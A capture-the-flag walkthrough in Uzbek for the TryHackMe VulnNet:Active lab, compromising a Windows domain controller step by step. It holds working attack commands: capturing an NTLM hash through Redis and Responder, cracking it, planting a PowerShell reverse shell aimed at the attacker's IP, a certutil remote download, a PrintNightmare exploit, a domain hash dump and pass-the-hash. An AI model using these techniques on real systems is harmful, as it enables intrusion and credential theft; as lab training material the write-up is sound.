# VulnNet:active 
Link: https://tryhackme.com/room/vulnnetactive

## Ishni doimgidek razvetkadan boshalymiz, buning uchun odatda ko'p ishlatadigan dasturimiz  `nmap` kerak bo'ladi.
```
┌──(me262㉿turkestan)-[~]
└─$ nmap -sV -sC -Pn -T4 -p- -O 10.48.129.182
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 01:30 +05
Stats: 0:05:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 96.23% done; ETC: 01:36 (0:00:13 remaining)
Nmap scan report for 10.48.129.182
Host is up (0.24s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-22T20:37:45
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 457.43 seconds
```

Yaxshi qanday servislar ochiq ekanini aniqladik. Bulardan eng muhimi hozircha redis va samba.
Endi esa enumeratsiya qilishni boshlaymiz. Bu borada `enum4linux-ng` dasturi yaxshi varyant.
```
┌──(me262㉿turkestan)-[~]
└─$ enum4linux-ng 10.48.129.182 -A           

ENUM4LINUX - next generation (v1.3.7)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.48.129.182
[*] Username ......... ''
[*] Random Username .. 'fkewznat'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.48.129.182    |
 ======================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: timed out
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: timed out
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.48.129.182    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.48.129.182    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                
  SMB 1.0: false                                                                                                   
  SMB 2.0.2: true                                                                                                  
  SMB 2.1: true                                                                                                    
  SMB 3.0: true                                                                                                    
  SMB 3.1.1: true                                                                                                  
Preferred dialect: SMB 3.0                                                                                         
SMB1 only: false                                                                                                   
SMB signing required: true                                                                                         

 ============================================================
|    Domain Information via SMB session for 10.48.129.182    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: VULNNET-BC3TCK1                                                                             
NetBIOS domain name: VULNNET                                                                                       
DNS domain: vulnnet.local                                                                                          
FQDN: VULNNET-BC3TCK1SHNQ.vulnnet.local                                                                            
Derived membership: domain member                                                                                  
Derived domain: VULNNET                                                                                            

 ==========================================
|    RPC Session Check on 10.48.129.182    |
 ==========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE

 ====================================================
|    Domain Information via RPC for 10.48.129.182    |
 ====================================================
[+] Domain: VULNNET
[+] Domain SID: S-1-5-21-1405206085-1650434706-76331420
[+] Membership: domain member

 ================================================
|    OS Information via RPC for 10.48.129.182    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                           
OS version: '10.0'                                                                                                 
OS release: '1809'                                                                                                 
OS build: '17763'                                                                                                  
Native OS: not supported                                                                                           
Native LAN manager: not supported                                                                                  
Platform id: null                                                                                                  
Server type: null                                                                                                  
Server type string: null                                                                                           

 ======================================
|    Users via RPC on 10.48.129.182    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 =======================================
|    Groups via RPC on 10.48.129.182    |
 =======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 =======================================
|    Shares via RPC on 10.48.129.182    |
 =======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ==========================================
|    Policies via RPC for 10.48.129.182    |
 ==========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ==========================================
|    Printers via RPC for 10.48.129.182    |
 ==========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 50.14 seconds
```
Yaxshi) Bizga qaytgan javobni quyidagi qismiga e'tibor qiling.
```
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
```
Ma'lumki anonymous RPC kirish mumkin.
Yaxshi endi redisni enumeratsiya qilishni boshlaymiz. Dastlab nmap orqali kengrong skaner qilamiz.
```
┌──(me262㉿turkestan)-[~]
└─$ nmap -p 6379 --script redis-info 10.48.129.182
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 01:44 +05
Nmap scan report for 10.48.129.182
Host is up (0.24s latency).

PORT     STATE SERVICE
6379/tcp open  redis
| redis-info: 
|   Version: 2.8.2402
|   Operating System: Windows  
|   Architecture: 64 bits
|   Process ID: 1880
|   Used CPU (sys): 0.05
|   Used CPU (user): 0.08
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 930.47K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|   Client connections: 
|_    192.168.190.26

Nmap done: 1 IP address (1 host up) scanned in 2.24 seconds
```

## Hash collecting

1. Redis'ning zaifligi:
Redis CONFIG SET dir buyrug'i orqali UNC yo'l (\\IP\share) qabul qiladi. Bu Windows'ga SMB orqali ulanishga urinishga olib keladi.

2. NTLMv2 hash'ini qanday olish:
Redis server UNC yo'lga murojaat qilganda, Windows avtomatik ravishda NTLM authentication boshlaydi

Bu authentication jarayonida NTLMv2 hash yaratiladi

Responder yordamida bu hash'ni olishimiz mumkin.

Jarayon. 
Responderni ishga tushiramiz.
```
sudo responder -I tun0 -dwv
```

Redisga ulanamiz va soxta.dll uchun so'rov yuboramiz.
```
┌──(me262㉿turkestan)-[~/CTF]
└─$ redis-cli -h 10.48.129.182
10.48.129.182:6379> CONFIG SET dir \\192.168.190.26\share\prosta_soxta_nom.dll
(error) ERR Changing directory: Permission denied
(1.45s)
10.48.129.182:6379> 
```
Va responderdagi natija:
```
[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                        

[SMB] NTLMv2-SSP Client   : 10.48.129.182
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:e2867015dae968f4:76FCE44DB86C9BBD03B828EB6FC89926:010100000000000080AD1475B073DC01F287074EF3C0F7780000000002000800510033003800450001001E00570049004E002D004600360034004B004D00340030004F0056004500470004003400570049004E002D004600360034004B004D00340030004F005600450047002E0051003300380045002E004C004F00430041004C000300140051003300380045002E004C004F00430041004C000500140051003300380045002E004C004F00430041004C000700080080AD1475B073DC0106000400020000000800300030000000000000000000000000300000A12E5BCE1603F39DEEDC815827F7D4D692AA42C25EE07F9304304CBE353626E80A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100390030002E00320036000000000000000000      
```

## Hash cracking
Olingan hashni rockyou.txt + john orqali buzamiz.
```
┌──(me262㉿turkestan)-[~/CTF/vulnnet-active]
└─$ echo "enterprise-security::VULNNET:e2867015dae968f4:76FCE44DB86C9BBD03B828EB6FC89926:010100000000000080AD1475B073DC01F287074EF3C0F7780000000002000800510033003800450001001E00570049004E002D004600360034004B004D00340030004F0056004500470004003400570049004E002D004600360034004B004D00340030004F005600450047002E0051003300380045002E004C004F00430041004C000300140051003300380045002E004C004F00430041004C000500140051003300380045002E004C004F00430041004C000700080080AD1475B073DC0106000400020000000800300030000000000000000000000000300000A12E5BCE1603F39DEEDC815827F7D4D692AA42C25EE07F9304304CBE353626E80A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100390030002E00320036000000000000000000" > hash    
                                                                                                                   
┌──(me262㉿turkestan)-[~/CTF/vulnnet-active]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sand_0873959498  (enterprise-security)     
1g 0:00:00:00 DONE (2025-12-23 02:06) 1.666g/s 6696Kp/s 6696Kc/s 6696KC/s sandoval69..samueldale
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
Qo'lga kiritilgan ma'lumot.
Username: enterprise-security
Password: sand_0873959498

Endi esa topilgan ma'lumotlar bilan enum4linux orqali yana enumeratsiya qilamiz.
```
enum4linux -u enterprise-security -p 'sand_0873959498' -a 10.48.129.182
```

Muhim natija:
```
 =================================( Share Enumeration on 10.48.129.182 )=================================
                                                                                                                   
do_connect: Connection to 10.48.129.182 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                           

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Enterprise-Share Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.48.129.182                                                                      
                                                                                                                   
//10.48.129.182/ADMIN$  Mapping: DENIED Listing: N/A Writing: N/A                                                  
//10.48.129.182/C$      Mapping: DENIED Listing: N/A Writing: N/A
//10.48.129.182/Enterprise-Share        Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                     
                                                                                                                   
NT_STATUS_NO_SUCH_FILE listing \*                                                                                  
//10.48.129.182/IPC$    Mapping: N/A Listing: N/A Writing: N/A
//10.48.129.182/NETLOGON        Mapping: OK Listing: OK Writing: N/A
//10.48.129.182/SYSVOL  Mapping: OK Listing: OK Writing: N/A
```
Ulashilyotgan papkalarni ko'ramiz.
```
┌──(me262㉿turkestan)-[~]
└─$ smbclient //10.48.129.182/Enterprise-Share -U 'enterprise-security'
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Feb 24 03:45:41 2021
  ..                                  D        0  Wed Feb 24 03:45:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 05:33:18 2021

                9558271 blocks of size 4096. 4949197 blocks available
smb: \> pwd
Current directory is \\10.48.129.182\Enterprise-Share\
smb: \> get PurgeIrrelevantData_1826.ps1
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
                                                                                                                   
┌──(me262㉿turkestan)-[~]
└─$ cat PurgeIrrelevantData_1826.ps1
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
                                                                                                                   
┌──(me262㉿turkestan)-[~]
└─$ 
```
enterprise-security da shekilli cron uchun qo'yilgan powershell script bor. Biz uni alishtirib `Initial Access` uchun reverse shell olishimiz mumkin.
Jarayon:
```
┌──(me262㉿turkestan)-[~/CTF]
└─$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
--2025-12-23 02:25:05--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8002::154, 2606:50c0:8003::154, 2606:50c0:8000::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8002::154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4339 (4.2K) [text/plain]
Saving to: ‘Invoke-PowerShellTcp.ps1.1’

Invoke-PowerShellTcp.ps1.1   100%[=============================================>]   4.24K  --.-KB/s    in 0.005s  

2025-12-23 02:25:11 (931 KB/s) - ‘Invoke-PowerShellTcp.ps1.1’ saved [4339/4339]

                                                                                                                   
┌──(me262㉿turkestan)-[~/CTF]
└─$ cp Invoke-PowerShellTcp.ps1 PurgeIrrelevantData_1826.ps1

                                                                                                                   
┌──(me262㉿turkestan)-[~/CTF]
└─$ echo "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.190.26 -Port 443" >> PurgeIrrelevantData_1826.ps1
                                                                                                                   
┌──(me262㉿turkestan)-[~/CTF]
└─$ 
┌──(me262㉿turkestan)-[~/CTF]
└─$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
--2025-12-23 02:25:05--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8002::154, 2606:50c0:8003::154, 2606:50c0:8000::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8002::154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4339 (4.2K) [text/plain]
Saving to: ‘Invoke-PowerShellTcp.ps1.1’

Invoke-PowerShellTcp.ps1.1   100%[=============================================>]   4.24K  --.-KB/s    in 0.005s  

2025-12-23 02:25:11 (931 KB/s) - ‘Invoke-PowerShellTcp.ps1.1’ saved [4339/4339]

                                                                                                                   
┌──(me262㉿turkestan)-[~/CTF]
└─$ cp Invoke-PowerShellTcp.ps1 PurgeIrrelevantData_1826.ps1

                                                                                                                   
┌──(me262㉿turkestan)-[~/CTF]
└─$ echo "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.190.26 -Port 4444" >> PurgeIrrelevantData_1826.ps1
                                                                                                                   
┌──(me262㉿turkestan)-[~/CTF]
└─$ 
```
Faylni yuklash:
```
┌──(me262㉿turkestan)-[~/CTF]
└─$ smbclient //10.48.129.182/Enterprise-Share -U 'enterprise-security'

Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> put PurgeIrrelevantData_1826.ps1
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (5.9 kb/s) (average 5.9 kb/s)
smb: \> 
```
Tigidish! Reverse shell qabul qilindi.
```
┌──(me262㉿turkestan)-[~]
└─$ nc -lvnp 4444            
listening on [any] 4444 ...
connect to [192.168.190.26] from (UNKNOWN) [10.48.129.182] 50140
Windows PowerShell running as user enterprise-security on VULNNET-BC3TCK1
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\enterprise-security\Downloads>
```
User.txt'ni qo'lga kiritish:
```
PS C:\Users\enterprise-security\Desktop> type user.txt                                                              
THM{copy_paste_qiladiganlarga_qarshiman_o'zingni_aldama}
```

## Privilage Escalation
Ana) PrintNightmare(CVE-2021-1675/CVE-2021-34527) zaifligi bor ekan.
Exploit uchun [LINK](https://github.com/calebstewart/CVE-2021-1675)

Uni o'zimizga yuklab olib python http server orqali uzatamiz. Men uzatishda 80 portdan foydalanaman. 
```
python3 -m http.server 80
```
Uni LOLBAS texnikasi orqali yuklab olamiz. 

```
certutil -urlcache -split -f http://10.23.20.245/CVE-2021-1675.ps1 C:\Users\enterprise-security\Downloads\CVE-2021–1675.ps1
```
```
Import-Module .\cve-2021–1675.ps1
```
```
Invoke-Nightmare
```
Bu exploit default holatda admin user yaratadi.
Username: adm1n
Passord: P@ssw0rd

secretsdump.py uchun userlarni yaratib oldik endi Administratorning hashini dump qilamiz va evil-winrm dasturi orqali pass-the-hash taktikasi orqali kiramiz.

Hashni dump qilish:
```
python3 /opt/impacket/examples/secretsdump.py -just-dc adm1n:P\@ssw0rd@10.48.129.182
```

Evil-winrm orqali kirish:
```
evil-winrm -i 10.48.129.182 -u Administrator -H 85d1fadbe37887ed63987f822acb47f1
```

System.txt'ni olish:
```
C:\Users\Administrator\Desktop>type system.txt
THM{copy_paste_qiladiganlarga_qarshiman_o'zingni_aldama}
```
